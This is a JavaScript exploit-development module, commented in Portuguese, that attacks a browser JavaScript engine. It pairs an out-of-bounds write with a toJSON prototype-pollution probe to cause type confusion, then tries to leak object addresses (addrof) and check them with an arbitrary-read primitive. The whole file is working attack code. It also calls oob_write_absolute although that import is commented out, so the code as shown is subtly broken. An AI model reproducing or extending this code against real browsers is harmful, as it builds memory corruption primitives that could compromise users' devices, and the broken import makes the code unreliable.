// js/script3/testArrayBufferVictimCrash.mjs (v82_AdvancedGetterLeak - Revisado 8: Integrando addrof de core_exploit v31)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs'; // isAdvancedInt64Object importado
import {
    triggerOOB_primitive,
    clearOOBEnvironment,
    // isOOBReady, // Não usado diretamente aqui, mas usado por arb_read/write
    arb_read,  // Do core_exploit.mjs (v31)
    arb_write, // Do core_exploit.mjs (v31)
    // oob_read_absolute,  // Usado internamente por arb_read/write
    // oob_write_absolute, // Usado internamente por arb_read/write
    attemptAddrofUsingCoreHeisenbug // Do core_exploit.mjs (v31)
} from '../core_exploit.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL = "OriginalHeisenbug_TypedArrayAddrof_v82_AdvancedGetterLeak";

const VICTIM_BUFFER_SIZE = 256;
const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET = 0x7C; // Usado para o setup da TC
const OOB_WRITE_VALUES_V82 = [0xFFFFFFFF, 0x7FFFFFFF];

const FILL_PATTERN_V82_FOR_GETTER_SCRATCHPAD = 0.82828282828282;
const PROBE_CALL_LIMIT_V82 = 10;

export async function executeTypedArrayVictimAddrofTest_AdvancedGetterLeak() {
    const FNAME_CURRENT_TEST_BASE = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL}_R8`;
    logS3(`--- Initiating ${FNAME_CURRENT_TEST_BASE}: Heisenbug TC + CoreExploit Addrof Attempt ---`, "test", FNAME_CURRENT_TEST_BASE);
    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL} Init R8...`;

    let iteration_results_summary = [];
    let best_result_for_runner = {
        errorOccurred: null,
        toJSON_details: null,
        stringifyResult: null,
        addrof_A_result_getter: { success: false, msg: "Addrof A (Getter TC): Not set.", value: null }, // Resultado do getter da TC
        addrof_A_result_core: { success: false, msg: "Addrof A (CoreExploit Func): Not set.", value: null, raw_double: null }, // Resultado de attemptAddrofUsingCoreHeisenbug
        addrof_B_result: { success: false, msg: "Addrof B (Direct TC): Not set.", value: null },
        oob_value_used: null,
        heisenbug_on_M2_confirmed_by_probe: false // Renomeado para clareza
    };
    
    let final_probe_call_count_for_report = 0;

    for (const current_oob_value of OOB_WRITE_VALUES_V82) {
        const FNAME_CURRENT_ITERATION = `${FNAME_CURRENT_TEST_BASE}_OOB${toHex(current_oob_value)}`;
        logS3(`\n===== ITERATION: OOB Write Value: ${toHex(current_oob_value)} =====`, "subtest", FNAME_CURRENT_ITERATION);

        let probe_call_count_iter = 0;
        let victim_typed_array_ref_iter = null;
        let marker_M1_ref_iter = null;
        let marker_M2_ref_iter = null;
        let iteration_final_tc_details_from_probe = null; 
        let iteration_tc_first_detection_done = false; 

        const current_object_to_leak_A = { marker_A_v82: `LeakA_OOB_Val${toHex(current_oob_value)}` , padding: Math.random()}; // Adiciona padding para diferenciar instâncias
        const current_object_to_leak_B = { marker_B_v82: `LeakB_OOB_Val${toHex(current_oob_value)}` , padding: Math.random()};
        
        function toJSON_TA_Probe_Iter_Closure() {
            // ... (Implementação da sonda da "Revisado 7" mantida para detecção da TC e tentativa de leak via getter)
            // A sonda atualiza iteration_final_tc_details_from_probe via closure.
            probe_call_count_iter++;
            const call_num = probe_call_count_iter;
            const current_this_type_str = Object.prototype.toString.call(this);
            const is_this_M2_confused = (this === marker_M2_ref_iter && marker_M2_ref_iter !== null && current_this_type_str === '[object Object]');

            logS3(`[PROBE_R8] Call #${call_num}. 'this': ${current_this_type_str}. IsM2Raw=${this === marker_M2_ref_iter}. IsM2Confused? ${is_this_M2_confused}. TC Flag: ${iteration_tc_first_detection_done}`, "leak");

            try {
                if (call_num > PROBE_CALL_LIMIT_V82) return { r_stop: "limit" };
                if (call_num === 1 && this === victim_typed_array_ref_iter) {
                    marker_M2_ref_iter = { marker_id_v82: "M2_Iter", some_prop_M2: "M2_Initial_Value_Iter" };
                    marker_M1_ref_iter = { marker_id_v82: "M1_Iter", payload_M2: marker_M2_ref_iter };
                    return marker_M1_ref_iter;
                } else if (is_this_M2_confused) {
                    if (!iteration_tc_first_detection_done) {
                        iteration_tc_first_detection_done = true; 
                        iteration_final_tc_details_from_probe = {
                            call_number_tc_detected: call_num, probe_variant: "TA_Probe_Iter_Closure_R8", this_type: "[object Object]", this_is_M2: true,
                            getter_defined: false, direct_prop_set: false, getter_fired_during_stringify: false,
                            leaked_value_from_getter_as_int64_str: null, leaked_value_is_potential_ptr: false, error_in_probe: null
                        };
                        logS3(`[PROBE_R8] Call #${call_num} (M2 Confused): FIRST TC detection. Details obj CREATED. ID: ${this.marker_id_v82}`, "vuln");
                    }
                    if (iteration_final_tc_details_from_probe && (!this.hasOwnProperty('leaky_A_getter_v82') || iteration_final_tc_details_from_probe.call_number_tc_detected === call_num)) {
                        try {
                            Object.defineProperty(this, 'leaky_A_getter_v82', {
                                get: function () {
                                    const tc_call_num = iteration_final_tc_details_from_probe ? iteration_final_tc_details_from_probe.call_number_tc_detected : "N/A";
                                    logS3(`[PROBE_R8] !!! Getter leaky_A (M2 TC call #${tc_call_num}) FIRED !!!`, "vuln");
                                    if (iteration_final_tc_details_from_probe) iteration_final_tc_details_from_probe.getter_fired_during_stringify = true;
                                    if (!victim_typed_array_ref_iter?.buffer) {
                                        if (iteration_final_tc_details_from_probe) iteration_final_tc_details_from_probe.leaked_value_from_getter_as_int64_str = "getter_victim_null_err";
                                        return "getter_victim_null_err";
                                    }
                                    let lvf = NaN, lis = "getter_err_r8"; 
                                    try {
                                        let vfv = new Float64Array(victim_typed_array_ref_iter.buffer); let vu32 = new Uint32Array(victim_typed_array_ref_iter.buffer);
                                        const o_l = vu32[0], o_h = vu32[1]; vfv[0] = current_object_to_leak_A;
                                        lvf = vfv[0]; let llo = vu32[0], lhi = vu32[1]; lis = new AdvancedInt64(llo, lhi).toString(true);
                                        vu32[0] = o_l; vu32[1] = o_h; 
                                        if (iteration_final_tc_details_from_probe) iteration_final_tc_details_from_probe.leaked_value_from_getter_as_int64_str = lis;
                                        logS3(`[PROBE_R8] Getter: Leaked Int64: ${lis}`, "leak");
                                        const nan_inf = (lhi >= 0x7FF00000 && lhi < 0x80000000) || (lhi >= 0xFFF00000 && lhi < 0x100000000);
                                        if (!nan_inf && lhi !== 0) {
                                            if ((lhi >= 0xFFFF0000) || (lhi > 0 && lhi < 0xF0000) || (lhi >= 0x100000 && lhi < 0x7F000000)) {
                                                if (iteration_final_tc_details_from_probe) iteration_final_tc_details_from_probe.leaked_value_is_potential_ptr = true;
                                                return lvf;
                                            } return "getter_val_not_in_ptr_range";
                                        } return "getter_val_is_nan_inf_or_zero";
                                    } catch (e_get) { lis = `getter_ex: ${e_get.message}`; if (iteration_final_tc_details_from_probe) iteration_final_tc_details_from_probe.leaked_value_from_getter_as_int64_str = lis; return lis; }
                                }, enumerable: true, configurable: true });
                            if (iteration_final_tc_details_from_probe) iteration_final_tc_details_from_probe.getter_defined = true;
                            this.leaky_B_direct_v82 = current_object_to_leak_B;
                            if (iteration_final_tc_details_from_probe) iteration_final_tc_details_from_probe.direct_prop_set = true;
                        } catch (e_m2_def) { if (iteration_final_tc_details_from_probe) iteration_final_tc_details_from_probe.error_in_probe = `M2_Def_Err: ${e_m2_def.message}`; }
                        logS3(`[PROBE_R8] Call #${call_num} (M2 Confused): Returning 'this'. TC Details snapshot: ${JSON.stringify(iteration_final_tc_details_from_probe)}`, "info");
                    }
                    return this; 
                }
            } catch (e_p_main) { return { err_p_main: call_num, msg: e_p_main.message }; }
            return { gen_m_iter: call_num, type: current_this_type_str };
        }
        // Fim da sonda toJSON_TA_Probe_Iter_Closure

        let iter_raw_stringify_output = null;
        let iter_stringify_output_parsed = null;
        let iter_error_tc_phase = null;
        let iter_addrof_getter_result = { success: false, msg: "Getter Addrof: Default", value: null };
        let iter_addrof_core_result = { success: false, msg: "CoreExploit Addrof: Default", value: null, raw_double: null };
        let iter_addrof_direct_result = { success: false, msg: "Direct Prop Addrof: Default", value: null };
        let heisenbugConfirmedThisIter = false;
        
        try { // Bloco principal da iteração
            await triggerOOB_primitive({ force_reinit: true });
            oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET, current_oob_value, 4);
            logS3(`  OOB Write done. Offset: ${toHex(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET)}`, "info", FNAME_CURRENT_ITERATION);
            await PAUSE_S3(150);

            victim_typed_array_ref_iter = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE)); 
            new Float64Array(victim_typed_array_ref_iter.buffer).fill(FILL_PATTERN_V82_FOR_GETTER_SCRATCHPAD);
            logS3(`  Victim Uint8Array created and filled.`, "info", FNAME_CURRENT_ITERATION);

            const ppKey = 'toJSON';
            let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
            let pollutionApplied = false;

            // Fase 1: Detecção da Type Confusion via sonda toJSON
            logS3(`  --- Fase 1: Detecção de Type Confusion ---`, "subtest", FNAME_CURRENT_ITERATION);
            try {
                Object.defineProperty(Object.prototype, ppKey, { value: toJSON_TA_Probe_Iter_Closure, writable: true, configurable: true, enumerable: false });
                pollutionApplied = true;
                iter_raw_stringify_output = JSON.stringify(victim_typed_array_ref_iter); 
                logS3(`  TC Phase: JSON.stringify completed. Raw: ${iter_raw_stringify_output}`, "info", FNAME_CURRENT_ITERATION);
                try { iter_stringify_output_parsed = JSON.parse(iter_raw_stringify_output); }
                catch (e_parse) { iter_stringify_output_parsed = { error_parsing_json: iter_raw_stringify_output }; }
                
                if (iteration_final_tc_details_from_probe && iteration_final_tc_details_from_probe.this_is_M2) {
                    heisenbugConfirmedThisIter = true;
                    logS3(`  TC Phase: TC on M2 CONFIRMED via iteration_final_tc_details_from_probe.`, "vuln", FNAME_CURRENT_ITERATION);
                    const m2_summary = iteration_final_tc_details_from_probe;
                    iter_addrof_getter_result.value = m2_summary.leaked_value_from_getter_as_int64_str;
                    if (m2_summary.leaked_value_is_potential_ptr) {
                        iter_addrof_getter_result.success = true;
                        iter_addrof_getter_result.msg = `Getter Addrof: Potential pointer ${m2_summary.leaked_value_from_getter_as_int64_str}`;
                    } else {
                        iter_addrof_getter_result.msg = `Getter Addrof: Val ${m2_summary.leaked_value_from_getter_as_int64_str || 'N/A'} not pointer.`;
                    }
                    // Checagem de leaky_B_direct_v82 (propriedade direta em M2)
                    let m2_obj_from_json = iter_stringify_output_parsed?.payload_M2 || iter_stringify_output_parsed;
                    if (m2_obj_from_json && marker_M2_ref_iter && m2_obj_from_json.marker_id_v82 === marker_M2_ref_iter.marker_id_v82) {
                        const val_direct = m2_obj_from_json.leaky_B_direct_v82;
                        iter_addrof_direct_result.value = val_direct;
                        if (val_direct && current_object_to_leak_B && val_direct.marker_B_v82 === current_object_to_leak_B.marker_B_v82) {
                            iter_addrof_direct_result.success = true; iter_addrof_direct_result.msg = `Direct Prop: objB identity confirmed.`;
                        } else { iter_addrof_direct_result.msg = `Direct Prop: Not objB identity. Val: ${JSON.stringify(val_direct)}`; }
                    } else { iter_addrof_direct_result.msg = "Direct Prop: M2 payload not in stringify output."; }
                } else {
                    logS3(`  TC Phase: TC on M2 NOT Confirmed. iteration_final_tc_details_from_probe: ${JSON.stringify(iteration_final_tc_details_from_probe)}`, "error", FNAME_CURRENT_ITERATION);
                }
            } catch (e_str) { iter_error_tc_phase = e_str; logS3(`  TC Phase: ERROR: ${e_str.message || String(e_str)}`, "critical", FNAME_CURRENT_ITERATION); } 
            finally {
                if (pollutionApplied) {
                    if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor);
                    else delete Object.prototype[ppKey];
                }
            }
            logS3(`  --- Fase 1 Concluída. TC M2 Detectada: ${heisenbugConfirmedThisIter} ---`, "subtest", FNAME_CURRENT_ITERATION);
            await PAUSE_S3(100);

            // Fase 2: Tentativa de Addrof usando attemptAddrofUsingCoreHeisenbug
            logS3(`  --- Fase 2: Tentativa de Addrof com attemptAddrofUsingCoreHeisenbug ---`, "subtest", FNAME_CURRENT_ITERATION);
            try {
                // Certifique-se que o ambiente OOB está como attemptAddrofUsingCoreHeisenbug espera (ele chama triggerOOB_primitive internamente)
                // Não precisa de clearOOBEnvironment aqui necessariamente se attemptAddrofUsingCoreHeisenbug força reinit.
                logS3(`  Addrof Core: Chamando attemptAddrofUsingCoreHeisenbug para current_object_to_leak_A...`, "info", FNAME_CURRENT_ITERATION);
                const core_addrof_raw_result = await attemptAddrofUsingCoreHeisenbug(current_object_to_leak_A);
                logS3(`  Addrof Core: Resultado de attemptAddrofUsingCoreHeisenbug: ${JSON.stringify(core_addrof_raw_result)}`, "leak", FNAME_CURRENT_ITERATION);

                if (core_addrof_raw_result) {
                    iter_addrof_core_result.msg = core_addrof_raw_result.message || "Resultado de Core Addrof recebido.";
                    iter_addrof_core_result.raw_double = core_addrof_raw_result.leaked_address_as_double;
                    if (core_addrof_raw_result.success && core_addrof_raw_result.leaked_address_as_int64) {
                        const leaked_addr64 = core_addrof_raw_result.leaked_address_as_int64;
                        iter_addrof_core_result.value = leaked_addr64.toString(true);
                        // Sanity check no endereço (exclui NaN e valores triviais)
                        const lhi_core = leaked_addr64.high();
                        const nan_inf_core = (lhi_core >= 0x7FF00000 && lhi_core < 0x80000000) || (lhi_core >= 0xFFF00000 && lhi_core < 0x100000000);
                        if (!nan_inf_core && (leaked_addr64.low() !== 0 || lhi_core !== 0)) { // Não é NaN e não é 0x0
                             // Adicionar heurística de ponteiro aqui se necessário
                            logS3(`  Addrof Core: Sucesso reportado. Endereço Vazado (Int64): ${leaked_addr64.toString(true)}`, "vuln", FNAME_CURRENT_ITERATION);
                            iter_addrof_core_result.success = true; 
                            // TENTATIVA DE VERIFICAÇÃO COM arb_read
                            try {
                                logS3(`  Addrof Core: Tentando verificar endereço ${leaked_addr64.toString(true)} com arb_read...`, "warn", FNAME_CURRENT_ITERATION);
                                const first_dword = await arb_read(leaked_addr64, 4); // Lê os primeiros 4 bytes do objeto
                                iter_addrof_core_result.msg += ` ArbRead Check: Read DWord ${toHex(first_dword)}.`;
                                logS3(`  Addrof Core: arb_read(${leaked_addr64.toString(true)}, 4) -> ${toHex(first_dword)}`, "leak", FNAME_CURRENT_ITERATION);
                                // Uma verificação mais robusta seria ler o StructureID ou um campo conhecido do objeto
                            } catch (e_arb_read_check) {
                                iter_addrof_core_result.msg += ` ArbRead Check FAILED: ${e_arb_read_check.message}.`;
                                logS3(`  Addrof Core: Falha ao verificar com arb_read: ${e_arb_read_check.message}`, "error", FNAME_CURRENT_ITERATION);
                            }
                        } else {
                            iter_addrof_core_result.msg = `Core Addrof: Sucesso reportado, mas valor ${leaked_addr64.toString(true)} parece NaN ou 0.`;
                            logS3(`  Addrof Core: ${iter_addrof_core_result.msg}`, "warn", FNAME_CURRENT_ITERATION);
                        }
                    } else {
                         logS3(`  Addrof Core: attemptAddrofUsingCoreHeisenbug não reportou sucesso ou endereço. Msg: ${core_addrof_raw_result.message}`, "warn", FNAME_CURRENT_ITERATION);
                    }
                } else {
                    iter_addrof_core_result.msg = "Core Addrof: attemptAddrofUsingCoreHeisenbug retornou nulo/inválido.";
                    logS3(`  Addrof Core: ${iter_addrof_core_result.msg}`, "error", FNAME_CURRENT_ITERATION);
                }
            } catch (e_core_addrof) {
                iter_addrof_core_result.msg = `Core Addrof: EXCEPTION: ${e_core_addrof.message || String(e_core_addrof)}`;
                logS3(`  Addrof Core: ${iter_addrof_core_result.msg}`, "critical", FNAME_CURRENT_ITERATION);
                if (!iter_error_tc_phase) iter_error_tc_phase = e_core_addrof; // Captura o erro principal se a fase TC passou
            }
            logS3(`  --- Fase 2 Concluída. Addrof Core Sucesso: ${iter_addrof_core_result.success} ---`, "subtest", FNAME_CURRENT_ITERATION);

        } catch (e_outer_iter) { // Erro na configuração da iteração
            iter_error_tc_phase = iter_error_tc_phase || e_outer_iter; 
            logS3(`  CRITICAL ERROR na iteração ${toHex(current_oob_value)}: ${e_outer_iter.message || String(e_outer_iter)}`, "critical", FNAME_CURRENT_ITERATION);
        } 
        finally {
            clearOOBEnvironment({ force_clear_even_if_not_setup: true });
        }

        final_probe_call_count_for_report = probe_call_count_iter;

        let current_iter_summary = {
            oob_value: toHex(current_oob_value),
            error: iter_error_tc_phase ? (iter_error_tc_phase.message || String(iter_error_tc_phase)) : null,
            tc_probe_details: iteration_final_tc_details_from_probe ? JSON.parse(JSON.stringify(iteration_final_tc_details_from_probe)) : null, 
            stringify_output_this_iter: iter_stringify_output_parsed,
            addrof_A_getter_this_iter: iter_addrof_getter_result, 
            addrof_A_core_this_iter: iter_addrof_core_result,
            addrof_B_direct_this_iter: iter_addrof_direct_result,
            heisenbug_on_M2_this_iter: heisenbugConfirmedThisIter
        };
        iteration_results_summary.push(current_iter_summary);
        
        // Lógica para atualizar best_result_for_runner
        const old_best_score = (best_result_for_runner.addrof_A_result_core.success) ? 3 : ((best_result_for_runner.addrof_A_result_getter.success || best_result_for_runner.addrof_B_result.success) ? 2 : (best_result_for_runner.heisenbug_on_M2_confirmed_by_probe ? 1 : 0));
        const current_score = (iter_addrof_core_result.success) ? 3 : ((iter_addrof_getter_result.success || iter_addrof_direct_result.success) ? 2 : (heisenbugConfirmedThisIter ? 1 : 0));

        if (current_score > old_best_score || (current_score > 0 && !best_result_for_runner.oob_value_used) ) {
             best_result_for_runner = {
                errorOccurred: iter_error_tc_phase ? (iter_error_tc_phase.message || String(iter_error_tc_phase)) : null,
                toJSON_details: iteration_final_tc_details_from_probe ? JSON.parse(JSON.stringify(iteration_final_tc_details_from_probe)) : null, 
                stringifyResult: iter_stringify_output_parsed,
                addrof_A_result_getter: iter_addrof_getter_result, 
                addrof_A_result_core: iter_addrof_core_result,
                addrof_B_result: iter_addrof_direct_result,
                oob_value_used: toHex(current_oob_value),
                heisenbug_on_M2_confirmed_by_probe: heisenbugConfirmedThisIter
            };
        } else if (!best_result_for_runner.oob_value_used && current_oob_value === OOB_WRITE_VALUES_V82[OOB_WRITE_VALUES_V82.length - 1]) {
             best_result_for_runner = { 
                errorOccurred: iter_error_tc_phase ? (iter_error_tc_phase.message || String(iter_error_tc_phase)) : best_result_for_runner.errorOccurred,
                toJSON_details: iteration_final_tc_details_from_probe ? JSON.parse(JSON.stringify(iteration_final_tc_details_from_probe)) : null, 
                stringifyResult: iter_stringify_output_parsed,
                addrof_A_result_getter: iter_addrof_getter_result, 
                addrof_A_result_core: iter_addrof_core_result,
                addrof_B_result: iter_addrof_direct_result,
                oob_value_used: toHex(current_oob_value),
                heisenbug_on_M2_confirmed_by_probe: heisenbugConfirmedThisIter
            };
        }
        
        // Atualiza título do documento
        if (iter_addrof_core_result.success) document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL}: AddrofCore OK! Val${toHex(current_oob_value)}`;
        else if (iter_addrof_getter_result.success || iter_addrof_direct_result.success) document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL}: AddrLeaked(Getter/Direct)! Val${toHex(current_oob_value)}`;
        else if (heisenbugConfirmedThisIter) document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL}: TC Confirmed Val${toHex(current_oob_value)}`;
        else document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL}: Iter ${toHex(current_oob_value)} Done`;
        
        await PAUSE_S3(250);
    } // Fim do loop for

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Completed All Iterations ---`, "test", FNAME_CURRENT_TEST_BASE);
    logS3(`Best/Final result for runner (detailed R8): ${JSON.stringify(best_result_for_runner, null, 2)}`, "debug", FNAME_CURRENT_TEST_BASE);
    
    return { 
        errorOccurred: best_result_for_runner.errorOccurred,
        toJSON_details: best_result_for_runner.toJSON_details, // Detalhes da sonda TC
        stringifyResult: best_result_for_runner.stringifyResult,
        addrof_A_result: best_result_for_runner.addrof_A_result_core, // Prioriza resultado do CoreExploit addrof
        addrof_B_result: best_result_for_runner.addrof_B_result, // Mantém o addrof_B (identidade)
        addrof_A_getter_details: best_result_for_runner.addrof_A_result_getter, // Para depuração do getter
        iteration_results_summary: iteration_results_summary,
        total_probe_calls_last_iter: final_probe_call_count_for_report,
        oob_value_of_best_result: best_result_for_runner.oob_value_used,
        heisenbug_on_M2_in_best_result: best_result_for_runner.heisenbug_on_M2_confirmed_by_probe
    };
}

// O runAllAdvancedTestsS3.mjs precisará ser adaptado para logar os novos campos de resultado,
// especialmente addrof_A_result (que agora vem de addrof_A_result_core) e addrof_A_getter_details.
